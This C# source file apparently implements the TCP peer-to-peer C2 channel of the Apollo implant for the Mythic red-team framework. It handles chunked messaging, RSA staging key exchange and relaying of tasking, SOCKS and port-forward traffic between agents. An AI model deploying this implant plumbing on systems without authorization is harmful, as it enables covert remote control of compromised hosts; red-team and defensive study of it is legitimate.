using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Interfaces;
using ApolloInterop.Classes;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Structs.ApolloStructs;
using System.Collections.Concurrent;
using ApolloInterop.Enums.ApolloEnums;
using System.Threading;
using ST = System.Threading.Tasks;
using ApolloInterop.Serializers;
using ApolloInterop.Constants;
using System.Net.Sockets;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Utils;

namespace TcpTransport
{
    public class TcpProfile : C2Profile, IC2Profile
    {

        internal struct AsyncTcpState
        {
            internal TcpClient Client;
            internal CancellationTokenSource Cancellation;
            internal ST.Task Task;
        }

        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private int _port;
        private int chunkSize = IPC.SEND_SIZE;
        private AsyncTcpServer _server;
        private bool _encryptedExchangeCheck;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private Dictionary<TcpClient, AsyncTcpState> _writerTasks = new Dictionary<TcpClient, AsyncTcpState>();
        private Action<object> _sendAction;
        
        private bool _uuidNegotiated = false;
        private ST.Task _agentConsumerTask = null;
        private ST.Task _agentProcessorTask = null;

        private UInt32 _currentMessageSize = 0;
        private UInt32 _currentMessageChunkNum = 0;
        private UInt32 _currentMessageTotalChunks = 0;
        private bool _currentMessageReadAllMetadata = false;
        private string _currentMessageID = Guid.NewGuid().ToString();
        private Byte[] _partialData = [];

        public TcpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            _port = int.Parse(data["port"]);
            _encryptedExchangeCheck = data["encrypted_exchange_check"] == "true";
            _sendAction = (object p) =>
            {
                CancellationTokenSource cts = ((AsyncTcpState)p).Cancellation;
                TcpClient c = ((AsyncTcpState)p).Client;
                while (c.Connected)
                {
                    _senderEvent.WaitOne();
                    if (!cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                    {
                        UInt32 totalChunksToSend = (UInt32)(result.Length / chunkSize) + 1;
                        DebugHelp.DebugWriteLine($"have {totalChunksToSend} chunks to send out");
                        byte[] totalChunkBytes = BitConverter.GetBytes(totalChunksToSend);
                        Array.Reverse(totalChunkBytes);
                        for (UInt32 currentChunk = 0; currentChunk < totalChunksToSend; currentChunk++)
                        {
                            byte[] chunkData;
                            if ((currentChunk + 1) * chunkSize > result.Length)
                            {
                                chunkData = new byte[result.Length - (currentChunk * chunkSize)];
                            }
                            else
                            {
                                chunkData = new byte[chunkSize];
                            }
                            Array.Copy(result, currentChunk * chunkSize, chunkData, 0, chunkData.Length);
                            byte[] sizeBytes = BitConverter.GetBytes((UInt32)chunkData.Length + 8);
                            Array.Reverse(sizeBytes);
                            byte[] currentChunkBytes = BitConverter.GetBytes(currentChunk);
                            Array.Reverse(currentChunkBytes);
                            DebugHelp.DebugWriteLine($"sending chunk {currentChunk}/{totalChunksToSend} with size {chunkData.Length + 8}");
                            c.GetStream().BeginWrite(sizeBytes, 0, sizeBytes.Length, OnAsyncMessageSent, p);
                            c.GetStream().BeginWrite(totalChunkBytes, 0, totalChunkBytes.Length, OnAsyncMessageSent, p);
                            c.GetStream().BeginWrite(currentChunkBytes, 0, currentChunkBytes.Length, OnAsyncMessageSent, p);
                            c.GetStream().BeginWrite(chunkData, 0, chunkData.Length, OnAsyncMessageSent, p);
                        }
                        //client.GetStream().BeginWrite(result, 0, result.Length, OnAsyncMessageSent, client);
                    }
                }
            };
        }

        public void OnAsyncConnect(object sender, TcpMessageEventArgs args)
        {
            if (_writerTasks.Count > 0)
            {
                args.Client.Close();
                return;
            }
            AsyncTcpState arg = new AsyncTcpState()
            {
                Client = args.Client,
                Cancellation = new CancellationTokenSource(),
            };
            ST.Task tmp = new ST.Task(_sendAction, arg);
            arg.Task = tmp;
            _writerTasks[args.Client] = arg;
            _writerTasks[args.Client].Task.Start();
            Connected = true;
        }

        public void OnAsyncDisconnect(object sender, TcpMessageEventArgs args)
        {
            args.Client.Client?.Close();
            if (_writerTasks.ContainsKey(args.Client))
            {
                var tmp = _writerTasks[args.Client];
                _writerTasks.Remove(args.Client);
                Connected = _writerTasks.Count > 0;

                tmp.Cancellation.Cancel();
                _senderEvent.Set();
                _receiverEvent.Set();

                tmp.Task.Wait();
            }
        }

        public void OnAsyncMessageReceived(object sender, TcpMessageEventArgs args)
        {
            Byte[] sData = args.Data.Data.Take(args.Data.DataLength).ToArray();
            DebugHelp.DebugWriteLine($"got message from remote connection with length: {sData.Length}");
            while (sData.Length > 0)
            {
                if (_currentMessageSize == 0)
                {
                    // This means we're looking at the start of a new message
                    if (sData.Length < 4)
                    {
                        // we didn't even get enough for a size

                    }
                    else
                    {
                        Byte[] messageSizeBytes = sData.Take(4).ToArray();
                        sData = sData.Skip(4).ToArray();
                        Array.Reverse(messageSizeBytes);  // reverse the bytes so they're in big endian?
                        _currentMessageSize = BitConverter.ToUInt32(messageSizeBytes, 0) - 8;
                        continue;
                    }
                }
                if (_currentMessageTotalChunks == 0)
                {
                    // This means we're looking at the start of a new message
                    if (sData.Length < 4)
                    {
                        // we didn't even get enough for a size

                    }
                    else
                    {
                        Byte[] messageSizeBytes = sData.Take(4).ToArray();
                        sData = sData.Skip(4).ToArray();
                        Array.Reverse(messageSizeBytes);  // reverse the bytes so they're in big endian?
                        _currentMessageTotalChunks = BitConverter.ToUInt32(messageSizeBytes, 0);
                        continue;
                    }
                }
                if (_currentMessageChunkNum == 0 && !_currentMessageReadAllMetadata)
                {
                    // This means we're looking at the start of a new message
                    if (sData.Length < 4)
                    {
                        // we didn't even get enough for a size

                    }
                    else
                    {
                        Byte[] messageSizeBytes = sData.Take(4).ToArray();
                        sData = sData.Skip(4).ToArray();
                        Array.Reverse(messageSizeBytes);  // reverse the bytes so they're in big endian?
                        _currentMessageChunkNum = BitConverter.ToUInt32(messageSizeBytes, 0) + 1;
                        _currentMessageReadAllMetadata = true;
                        continue;
                    }

                }
                // try to read up to the remaining number of bytes
                if (_partialData.Length + sData.Length > _currentMessageSize)
                {
                    // we potentially have this message and the next data in the pipeline
                    byte[] nextData = sData.Take((int)_currentMessageSize - _partialData.Length).ToArray();
                    _partialData = [.. _partialData, .. nextData];
                    sData = sData.Skip(nextData.Length).ToArray();

                }
                else
                {
                    // we don't enough enough data to max out the current message size, so take it all
                    _partialData = [.. _partialData, .. sData];
                    sData = sData.Skip(sData.Length).ToArray();
                }
                if (_partialData.Length == _currentMessageSize)
                {
                    DebugHelp.DebugWriteLine($"got chunk {_currentMessageChunkNum}/{_currentMessageTotalChunks} with size {_currentMessageSize + 8}");
                    UnwrapMessage();
                    _currentMessageSize = 0;
                    _currentMessageChunkNum = 0;
                    _currentMessageTotalChunks = 0;
                    _currentMessageReadAllMetadata = false;
                }
            }
        }

        private void UnwrapMessage()
        {
            IPCChunkedData chunkedData = new(id: _currentMessageID, 
                chunkNum: (int)_currentMessageChunkNum, totalChunks: (int)_currentMessageTotalChunks, 
                mt: MessageType.MessageResponse,
                data: _partialData.Take(_partialData.Length).ToArray());
            _partialData = [];
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
            if (_currentMessageChunkNum == _currentMessageTotalChunks)
            {
                _currentMessageID = Guid.NewGuid().ToString();
            }
        }

        private void OnAsyncMessageSent(IAsyncResult result)
        {
            TcpClient client = ((AsyncTcpState)result.AsyncState).Client;
           // TcpClient client = (TcpClient)result.AsyncState;
            client.GetStream().EndWrite(result);
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            string serializedData = Serializer.Serialize(msg);
            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(serializedData));
            _senderEvent.Set();
            return true;
        }

        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for(int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = Serializer.DeserializeIPCMessage(data.ToArray(), mt);
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }


        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive())
            {
                _receiverEvent.WaitOne();
                IMythicMessage msg = _recieverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    _recieverQueue = new ConcurrentQueue<IMythicMessage>(_recieverQueue.Where(m => m != msg));
                    return onResp(msg);
                }
                if (!Connected)
                    break;
            }
            return true;
        }


        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (_server == null)
            {
                _server = new AsyncTcpServer(_port, IPC.SEND_SIZE, IPC.RECV_SIZE);
                _server.ConnectionEstablished += OnAsyncConnect;
                _server.MessageReceived += OnAsyncMessageReceived;
                _server.Disconnect += OnAsyncDisconnect;
            }

            if (_encryptedExchangeCheck && !_uuidNegotiated)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };
                AddToSenderQueue(handshake1);
                if (!Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                {
                    MessageResponse respHandshake = (MessageResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            AddToSenderQueue(checkinMsg);
            if (_agentProcessorTask == null || _agentProcessorTask.IsCompleted)
            {
                return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                {
                    MessageResponse mResp = (MessageResponse)resp;
                    if (!_uuidNegotiated)
                    {
                        _uuidNegotiated = true;
                        ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                        checkinMsg.UUID = mResp.ID;
                    }
                    Connected = true;
                    return onResp(mResp);
                });
            } else
            {
                return true;
            }
        }

        public void Start()
        {
            _agentConsumerTask = new ST.Task(() =>
            {
                while (Agent.IsAlive() && _writerTasks.Count > 0)
                {
                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                    {
                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0 || tm.Rpfwd.Length != 0 || tm.Edges.Length != 0)
                        {
                            AddToSenderQueue(tm);
                            return true;
                        }
                        return false;
                    }))
                    {
                        Thread.Sleep(100);
                    }
                }
            });
            _agentProcessorTask = new ST.Task(() =>
            {
                while (Agent.IsAlive() && _writerTasks.Count > 0)
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            });
            _agentConsumerTask.Start();
            _agentProcessorTask.Start();
            _agentProcessorTask.Wait();
            _agentConsumerTask.Wait();
        }

        public bool Send<IMythicMessage>(IMythicMessage message)
        {
            return AddToSenderQueue((ApolloInterop.Interfaces.IMythicMessage)message);
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        public bool IsOneWay()
        {
            return true;
        }

        public bool IsConnected()
        {
            return _writerTasks.Keys.Count > 0;
        }
    }
}
